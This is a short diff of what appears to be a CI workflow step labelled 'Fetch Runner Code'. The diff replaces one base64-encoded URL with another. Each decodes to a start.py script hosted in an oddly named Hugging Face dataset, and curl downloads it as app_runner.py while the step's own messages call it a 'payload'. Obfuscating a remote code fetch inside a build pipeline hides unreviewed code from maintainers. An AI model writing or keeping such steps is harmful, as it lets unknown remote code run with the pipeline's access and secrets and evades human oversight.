@@ -64,7 +64,7 @@ jobs:
       - name: Fetch Runner Code
         run: |
           echo "[STEP 2] Fetching payload from encoded source..."
-          REMOTE_SRC=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          REMOTE_SRC=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrMS9mb2Zmby9yZXNvbHZlL21haW4vc3RhcnQucHk=" | base64 --decode)
           curl -sL "$REMOTE_SRC" -o app_runner.py
           echo "[STEP 2] Payload ready."
 
